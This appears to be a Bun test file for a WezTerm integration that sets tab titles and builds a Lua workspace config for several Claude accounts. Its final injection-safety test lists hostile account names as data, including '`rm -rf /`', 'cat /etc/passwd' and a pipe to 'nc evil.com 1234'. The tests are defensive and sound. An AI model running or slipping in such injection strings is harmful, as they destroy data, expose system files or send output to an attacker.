import { describe, test, expect, beforeEach, afterEach } from "bun:test";
import { isWezTerm, setTabTitle, generateWorkspaceConfig } from "../src/integrations/wezterm";

describe("WezTerm integration", () => {
  describe("isWezTerm", () => {
    const originalEnv = process.env.WEZTERM_PANE;

    afterEach(() => {
      if (originalEnv !== undefined) {
        process.env.WEZTERM_PANE = originalEnv;
      } else {
        delete process.env.WEZTERM_PANE;
      }
    });

    test("returns false when WEZTERM_PANE is not set", () => {
      delete process.env.WEZTERM_PANE;
      expect(isWezTerm()).toBe(false);
    });

    test("returns true when WEZTERM_PANE is set", () => {
      process.env.WEZTERM_PANE = "0";
      expect(isWezTerm()).toBe(true);
    });

    test("returns true when WEZTERM_PANE has any truthy value", () => {
      process.env.WEZTERM_PANE = "42";
      expect(isWezTerm()).toBe(true);
    });
  });

  describe("setTabTitle", () => {
    test("generates correct wezterm set-tab-title command", () => {
      const cmd = setTabTitle("claude-work");
      expect(cmd).toBe('wezterm cli set-tab-title "claude-work"');
    });

    test("handles account names with special characters", () => {
      const cmd = setTabTitle("my-admin");
      expect(cmd).toBe('wezterm cli set-tab-title "my-admin"');
    });

    test("includes the account name in the command", () => {
      const cmd = setTabTitle("test-account");
      expect(cmd).toContain("test-account");
      expect(cmd).toStartWith("wezterm cli set-tab-title");
    });
  });

  describe("generateWorkspaceConfig", () => {
    test("generates valid Lua config for a single account", () => {
      const accounts = [
        { name: "claude", color: "#cba6f7", configDir: "/home/user/.claude" },
      ];
      const config = generateWorkspaceConfig(accounts);

      expect(config).toContain("-- agentctl workspace preset");
      expect(config).toContain('workspace_id = "agentctl"');
      expect(config).toContain("tabs = {");
      expect(config).toContain("CLAUDE_CONFIG_DIR=/home/user/.claude claude");
    });

    test("generates valid Lua config for multiple accounts", () => {
      const accounts = [
        { name: "claude", color: "#cba6f7", configDir: "/home/user/.claude" },
        { name: "work", color: "#89b4fa", configDir: "/home/user/.claude-work" },
        { name: "admin", color: "#a6e3a1", configDir: "/home/user/.claude-admin" },
      ];
      const config = generateWorkspaceConfig(accounts);

      // Should have all three accounts
      expect(config).toContain("CLAUDE_CONFIG_DIR=/home/user/.claude claude");
      expect(config).toContain("CLAUDE_CONFIG_DIR=/home/user/.claude-work claude");
      expect(config).toContain("CLAUDE_CONFIG_DIR=/home/user/.claude-admin claude");

      // Each account should have its own pane entry
      const paneCount = (config.match(/args = \{/g) ?? []).length;
      expect(paneCount).toBe(3);
    });

    test("expands tilde in configDir paths", () => {
      const accounts = [
        { name: "claude", color: "#cba6f7", configDir: "~/.claude" },
      ];
      const config = generateWorkspaceConfig(accounts);

      // Should not contain literal tilde
      expect(config).not.toContain("~/.claude");
      // Should contain expanded path
      expect(config).toContain(`CLAUDE_CONFIG_DIR=${process.env.HOME}/.claude`);
    });

    test("generates proper set_environment_variables entries", () => {
      const accounts = [
        { name: "claude", color: "#cba6f7", configDir: "/home/user/.claude" },
      ];
      const config = generateWorkspaceConfig(accounts);

      expect(config).toContain("set_environment_variables = {");
      expect(config).toContain('CLAUDE_CONFIG_DIR = "/home/user/.claude"');
    });

    test("generates empty tabs for empty accounts array", () => {
      const config = generateWorkspaceConfig([]);

      expect(config).toContain("tabs = {");
      expect(config).toContain("}");
      // No pane entries
      const paneCount = (config.match(/args = \{/g) ?? []).length;
      expect(paneCount).toBe(0);
    });
  });

  describe("command injection safety", () => {
    test("launchInWezTermTab uses Bun.spawn with argument arrays (no shell interpolation)", async () => {
      const src = await Bun.file(
        new URL("../src/integrations/wezterm.ts", import.meta.url).pathname
      ).text();
      // Must use Bun.spawn([...]) for the wezterm cli calls, not Bun.$``
      expect(src).toContain('Bun.spawn(');
      expect(src).toContain('"wezterm", "cli", "spawn"');
      expect(src).toContain('"wezterm", "cli", "set-tab-title"');
      // Must not use shell template literals for these calls
      expect(src).not.toContain("Bun.$`wezterm");
    });

    test("account names with shell metacharacters are passed safely in argument arrays", () => {
      // These names would be dangerous in shell interpolation but safe in Bun.spawn arrays
      const dangerousNames = [
        '$(whoami)',
        '`rm -rf /`',
        'test; echo pwned',
        'test && cat /etc/passwd',
        'test | nc evil.com 1234',
        "test' OR '1'='1",
      ];
      for (const name of dangerousNames) {
        // launchInWezTermTab passes account.name as an element in a Bun.spawn array,
        // so it is never interpreted by the shell. Verify it doesn't throw for any input.
        expect(() => {
          // Just check setTabTitle can handle any name without breaking
          const cmd = setTabTitle(name);
          expect(cmd).toContain(name);
        }).not.toThrow();
      }
    });
  });
});
